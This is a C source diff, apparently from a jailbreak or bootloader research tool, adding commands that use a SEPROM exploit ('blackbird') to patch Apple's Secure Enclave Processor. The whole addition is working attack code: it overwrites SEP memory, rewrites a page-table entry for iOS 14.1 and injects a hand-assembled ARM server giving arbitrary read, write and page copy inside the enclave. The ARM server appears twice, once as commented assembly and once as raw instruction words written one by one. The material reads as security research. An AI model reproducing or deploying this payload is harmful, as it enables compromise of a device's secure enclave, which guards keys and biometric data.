@@ -1029,6 +1029,289 @@ void sep_auto(const char* cmd, char* args)
     }
 }
 
+void sep_step_forward(const char* cmd, char* args) {
+    sep_auto(NULL, NULL);
+    iprintf("sep auto: 0x%x\n", sepbp);
+    
+    __asm__ volatile("dsb sy");
+
+    sep_blackbird_write(0xD0E000F8, 0xe3a03000); // mov r3, #0x0
+    sep_blackbird_write(0xD0E000FC, 0xe50f30f8); // str r3, [pc, #-0xf8]
+    sep_blackbird_write(0xD0E00100, 0xe50f30f8); // str r3, [pc, #-0xf8]
+    sep_blackbird_write(0xD0E00104, 0xe50f30f8); // str r3, [pc, #-0xf8]
+    sep_blackbird_write(0xD0E00108, 0xeaffffc2); // b #-0xf8
+
+    // patch, LR = 0xD0E000F8
+    sep_blackbird_write(0x544, 0xe300e0f8); // MOVW LR, #0x00F8
+    sep_blackbird_write(0x548, 0xe34de0e0); // MOVT LR, #0xD0E0
+
+    __asm__ volatile("dsb sy");
+
+    // boot
+    sep_blackbird_boot(sepbp);
+
+    uint32_t volatile* arg0 = (uint32_t*)0x210E00010;
+    while (1) {
+        __asm__ volatile("dsb sy");
+        uint32_t tmp = *arg0;
+        if ((tmp != 0) && (tmp != sepbp)) {
+            break;
+        }
+    }
+    sepbp = *arg0;
+
+    iprintf("sep step: 0x%x\n", sepbp);
+}
+
+void sep_step_forward2(const char* cmd, char* args) {
+    iprintf("sep step2: inject rw server\n");
+
+    // inject rw server
+    __asm__ volatile("dsb sy");
+    /*
+    .macro PRTS_FlushCache
+      DSB SY
+      ISB SY
+    .endm
+
+    .macro PRTS_DisableMMU
+      PRTS_FlushCache
+      MRC    p15, #0, $0, c1, c0, #0
+      BIC $0, $0, #1
+      MCR    p15, #0, $0, c1, c0, #0
+      PRTS_FlushCache
+    .endm
+
+    .macro PRTS_EnableMMU
+      PRTS_FlushCache
+      MRC    p15, #0, $0, c1, c0, #0
+      ORR $0, $0, #1
+      MCR    p15, #0, $0, c1, c0, #0
+      PRTS_FlushCache
+    .endm
+
+    .text
+    .code 32
+      B L_CODE_Entry
+
+    @ iOS-v14.1
+    L_ADDR_PT:
+      .word 0x80013008
+    L_ADDR_JumpBack:
+      .word 0x80005BDC
+
+    L_DATA_PT_Value:
+      .word 0x00000629, 0x00000002
+
+    @ Protocol:
+    @   +4: Address
+    @   +8: Value
+    @   +C: Command
+    L_ADDR_RWAddr:
+      .word 0x50E00004 // 0x210E00004
+    L_ADDR_RWVal:
+      .word 0x50E00008 // 0x210E00008
+
+    @ CMD:
+    @   0: Nothing
+    @   1: Read
+    @   2: Write Phys
+    @   3: Write Virt
+    @   4: Copy Page
+    L_ADDR_RWCmd:
+      .word 0x50E0000C // 0x210E0000C
+
+    L_ADDR_CopyPageDest:
+      .word 0x50E00200 // 0x210E00200
+
+    L_CODE_Entry:
+      PUSH {R0-R12}
+      DSB SY
+      LDR R3, L_ADDR_PT
+      LDR R3, [R3]
+      CMP R3, #0x0
+      LDR R3, L_ADDR_PT
+      BNE L_CODE_RWSrv
+      ADR R4, L_DATA_PT_Value
+      LDRD R6, R7, [R4, #0x00]
+      STRD R6, R7, [R3, #0x00]
+      PRTS_FlushCache
+      MOV R3, #0x0
+      MCR p15, #0, R3, c8, c7, #0
+      LDR R3, L_ADDR_RWCmd
+      MOV R4, #0x0
+      STR R4, [R3]
+
+    L_CODE_RWSrv:
+      LDR R3, L_ADDR_RWCmd
+      LDR R3, [R3]
+      CMP R3, #0x0
+      BEQ L_CODE_JumpBack
+      CMP R3, #0x1
+      BEQ L_CODE_Read
+      CMP R3, #0x2
+      BEQ L_CODE_WritePhys
+      CMP R3, #0x3
+      BEQ L_CODE_Write
+      CMP R3, #0x4
+      BEQ L_CODE_CopyPage
+      B L_CODE_JumpBack
+
+    L_CODE_Read:
+      LDR R4, L_ADDR_RWAddr
+      LDR R5, L_ADDR_RWVal
+      LDR R4, [R4]
+      @ PRTS_DisableMMU R0
+      LDR R4, [R4]
+      @ PRTS_EnableMMU R0
+      STR R4, [R5]
+      B L_CODE_JumpBack
+
+    L_CODE_WritePhys:
+      LDR R4, L_ADDR_RWAddr
+      LDR R5, L_ADDR_RWVal
+      LDR R4, [R4]
+      LDR R5, [R5]
+      PRTS_DisableMMU R0
+      STR R5, [R4]
+      PRTS_EnableMMU R0
+      B L_CODE_JumpBack
+
+    L_CODE_Write:
+      LDR R4, L_ADDR_RWAddr
+      LDR R5, L_ADDR_RWVal
+      LDR R4, [R4]
+      LDR R5, [R5]
+      STR R5, [R4]
+      B L_CODE_JumpBack
+
+    L_CODE_CopyPage:
+      LDR R0, L_ADDR_RWAddr
+      LDR R0, [R0]
+      LDR R1, L_ADDR_CopyPageDest
+      MOV R2, #0x80
+    L_CopyPageLoop:
+      CMP R2, #0x0
+      BEQ L_CODE_JumpBack
+      LDMIA R0, { R3, R4, R5, R6, R8, R10, R11, R12 }
+      STMIA    R1, { R3, R4, R5, R6, R8, R10, R11, R12 }
+      ADD R0, #0x20
+      ADD R1, #0x20
+      SUB R2, #0x1
+      B L_CopyPageLoop
+
+    L_CODE_JumpBack:
+      LDR R3, L_ADDR_RWCmd
+      MOV R4, #0x0
+      STR R4, [R3]
+      POP {R0-R12}
+      DSB SY
+      WFI
+      LDR PC, L_ADDR_JumpBack
+    */
+    sep_blackbird_write(0x1150, 0xea000007);
+    sep_blackbird_write(0x1154, 0x80013008);
+    sep_blackbird_write(0x1158, 0x80005bdc);
+    sep_blackbird_write(0x115c, 0x00000629);
+    sep_blackbird_write(0x1160, 0x00000002);
+    sep_blackbird_write(0x1164, 0x50e00004);
+    sep_blackbird_write(0x1168, 0x50e00008);
+    sep_blackbird_write(0x116c, 0x50e0000c);
+    sep_blackbird_write(0x1170, 0x50e00200);
+    sep_blackbird_write(0x1174, 0xe92d1fff);
+    sep_blackbird_write(0x1178, 0xf57ff04f);
+    sep_blackbird_write(0x117c, 0xe51f3030);
+    sep_blackbird_write(0x1180, 0xe5933000);
+    sep_blackbird_write(0x1184, 0xe3530000);
+    sep_blackbird_write(0x1188, 0xe51f303c);
+    sep_blackbird_write(0x118c, 0x1a000009);
+    sep_blackbird_write(0x1190, 0xe24f403c);
+    sep_blackbird_write(0x1194, 0xe1c460d0);
+    sep_blackbird_write(0x1198, 0xe1c360f0);
+    sep_blackbird_write(0x119c, 0xf57ff04f);
+    sep_blackbird_write(0x11a0, 0xf57ff06f);
+    sep_blackbird_write(0x11a4, 0xe3a03000);
+    sep_blackbird_write(0x11a8, 0xee083f17);
+    sep_blackbird_write(0x11ac, 0xe51f3048);
+    sep_blackbird_write(0x11b0, 0xe3a04000);
+    sep_blackbird_write(0x11b4, 0xe5834000);
+    sep_blackbird_write(0x11b8, 0xe51f3054);
+    sep_blackbird_write(0x11bc, 0xe5933000);
+    sep_blackbird_write(0x11c0, 0xe3530000);
+    sep_blackbird_write(0x11c4, 0x0a000034);
+    sep_blackbird_write(0x11c8, 0xe3530001);
+    sep_blackbird_write(0x11cc, 0x0a000006);
+    sep_blackbird_write(0x11d0, 0xe3530002);
+    sep_blackbird_write(0x11d4, 0x0a00000a);
+    sep_blackbird_write(0x11d8, 0xe3530003);
+    sep_blackbird_write(0x11dc, 0x0a00001c);
+    sep_blackbird_write(0x11e0, 0xe3530004);
+    sep_blackbird_write(0x11e4, 0x0a000020);
+    sep_blackbird_write(0x11e8, 0xea00002b);
+    sep_blackbird_write(0x11ec, 0xe51f4090);
+    sep_blackbird_write(0x11f0, 0xe51f5090);
+    sep_blackbird_write(0x11f4, 0xe5944000);
+    sep_blackbird_write(0x11f8, 0xe5944000);
+    sep_blackbird_write(0x11fc, 0xe5854000);
+    sep_blackbird_write(0x1200, 0xea000025);
+    sep_blackbird_write(0x1204, 0xe51f40a8);
+    sep_blackbird_write(0x1208, 0xe51f50a8);
+    sep_blackbird_write(0x120c, 0xe5944000);
+    sep_blackbird_write(0x1210, 0xe5955000);
+    sep_blackbird_write(0x1214, 0xf57ff04f);
+    sep_blackbird_write(0x1218, 0xf57ff06f);
+    sep_blackbird_write(0x121c, 0xee110f10);
+    sep_blackbird_write(0x1220, 0xe3c00001);
+    sep_blackbird_write(0x1224, 0xee010f10);
+    sep_blackbird_write(0x1228, 0xf57ff04f);
+    sep_blackbird_write(0x122c, 0xf57ff06f);
+    sep_blackbird_write(0x1230, 0xe5845000);
+    sep_blackbird_write(0x1234, 0xf57ff04f);
+    sep_blackbird_write(0x1238, 0xf57ff06f);
+    sep_blackbird_write(0x123c, 0xee110f10);
+    sep_blackbird_write(0x1240, 0xe3800001);
+    sep_blackbird_write(0x1244, 0xee010f10);
+    sep_blackbird_write(0x1248, 0xf57ff04f);
+    sep_blackbird_write(0x124c, 0xf57ff06f);
+    sep_blackbird_write(0x1250, 0xea000011);
+    sep_blackbird_write(0x1254, 0xe51f40f8);
+    sep_blackbird_write(0x1258, 0xe51f50f8);
+    sep_blackbird_write(0x125c, 0xe5944000);
+    sep_blackbird_write(0x1260, 0xe5955000);
+    sep_blackbird_write(0x1264, 0xe5845000);
+    sep_blackbird_write(0x1268, 0xea00000b);
+    sep_blackbird_write(0x126c, 0xe51f0110);
+    sep_blackbird_write(0x1270, 0xe5900000);
+    sep_blackbird_write(0x1274, 0xe51f110c);
+    sep_blackbird_write(0x1278, 0xe3a02080);
+    sep_blackbird_write(0x127c, 0xe3520000);
+    sep_blackbird_write(0x1280, 0x0a000005);
+    sep_blackbird_write(0x1284, 0xe8901d78);
+    sep_blackbird_write(0x1288, 0xe8811d78);
+    sep_blackbird_write(0x128c, 0xe2800020);
+    sep_blackbird_write(0x1290, 0xe2811020);
+    sep_blackbird_write(0x1294, 0xe2422001);
+    sep_blackbird_write(0x1298, 0xeafffff7);
+    sep_blackbird_write(0x129c, 0xe51f3138);
+    sep_blackbird_write(0x12a0, 0xe3a04000);
+    sep_blackbird_write(0x12a4, 0xe5834000);
+    sep_blackbird_write(0x12a8, 0xe8bd1fff);
+    sep_blackbird_write(0x12ac, 0xf57ff04f);
+    sep_blackbird_write(0x12b0, 0xe320f003);
+    sep_blackbird_write(0x12b4, 0xe51ff164);
+    __asm__ volatile("dsb sy");
+
+    // patch
+    __asm__ volatile("dsb sy");
+    sep_blackbird_write(0x5BD4, 0xe51ff004); // Jump to 0x1150, the rw server
+    sep_blackbird_write(0x5BD8, 0x1150);
+    __asm__ volatile("dsb sy");
+
+    iprintf("sep boot: 0x%x\n", sepbp);
+    is_waiting_to_boot = 0;
+    sep_blackbird_boot(sepbp);
+}
+
 static struct sep_command command_table[] = {
     SEP_COMMAND("help", "show usage", sep_help),
     SEP_COMMAND("auto", "automatically decide what to do", sep_auto),
@@ -1049,6 +1332,9 @@ static struct sep_command command_table[] = {
 #endif
     SEP_COMMAND("encrypt", "encrypt a kbag (requires pwned SEPROM)", sep_aes_encrypt),
     SEP_COMMAND("decrypt", "decrypt a kbag (requires pwned SEPROM)", sep_aes_decrypt),
+    // Proteas
+    SEP_COMMAND("step", "step forward to next stage", sep_step_forward),
+    SEP_COMMAND("step2", "step forward to next stage", sep_step_forward2),
 };
 
 void sep_help(const char* cmd, char* args) {
